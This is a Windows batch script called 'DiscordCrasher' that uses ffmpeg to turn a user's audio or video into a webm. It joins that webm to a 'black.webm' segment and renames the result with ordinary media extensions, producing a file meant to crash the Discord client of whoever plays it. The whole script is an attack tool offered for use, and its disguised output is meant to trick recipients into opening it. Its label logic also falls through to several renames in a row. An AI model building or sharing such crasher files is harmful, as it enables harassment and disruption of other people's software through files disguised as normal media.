@echo off
title "DiscordCrasher | remade by ghostfxck#0001 creds to TrollFaceGaming#8170"
color 0A
mkdir export
set /p name=Type the video or audio file name (mp3/mp4 only, do not type the filename extension): 
set /p crashername=Type the crasher file name: 
cls
set /P c=Is the file you're trying to modify a mp3[Y/N]?: 
if /I "%c%" EQU "Y" goto :audio
if /I "%c%" EQU "N" goto :video
goto :end
:video
cls
ffmpeg -i %name%.mp4 -pix_fmt yuv444p video.webm
(
echo file video.webm
echo file black.webm
)>"TheSyntaxUnit.txt"
ffmpeg -f concat -i TheSyntaxUnit.txt -codec copy %crashername%.webm
del "TheSyntaxUnit.txt"
del "video.webm"
cls
echo default filename extension is webm
set /P c=Do you want to convert the crasher into other supported extensions[Y/N]?: 
cls
if /I "%c%" EQU "Y" goto :convert
if /I "%c%" EQU "N" move %crashername%.webm .\export && goto :end
goto :end
:convert
echo List of supported filename extensions:
echo ogg
echo mov
echo mp3
echo mp4
set /P c=Type the any filename extension you want listed above: 
if /I "%c%" EQU "ogg" goto :ogg
if /I "%c%" EQU "mov" goto :mov
if /I "%c%" EQU "mp3" goto :mp3
if /I "%c%" EQU "mp4" goto :mp4
if /I "%c%" EQU "wav" goto :wav
goto :end
:ogg
rename %crashername%.webm %crashername%.ogg && move %crashername%.ogg .\export
:mov
rename %crashername%.webm %crashername%.mov && move %crashername%.mov .\export
:mp3
rename %crashername%.webm %crashername%.mp3 && move %crashername%.mp3 .\export
:mp4
rename %crashername%.webm %crashername%.mp4 && move %crashername%.mp4 .\export
:wav
rename %crashername%.webm %crashername%.wav && move %crashername%.wav .\export

:audio
cls
ffmpeg -f lavfi -i color=c=black:s=1280x720:r=5 -i %name%.mp3 -crf 0 -c:a copy -shortest output.mp4
ffmpeg -i output.mp4 -pix_fmt yuv444p video.webm
(
echo file video.webm
echo file black.webm
)>"TheSyntaxUnit.txt"
ffmpeg -f concat -i TheSyntaxUnit.txt -codec copy %crashername%.webm
rename %crashername%.webm %crashername%.mp3 && move %crashername%.mp3 .\export
del "TheSyntaxUnit.txt"
del "output.mp4"
del "video.webm"
:end
exit
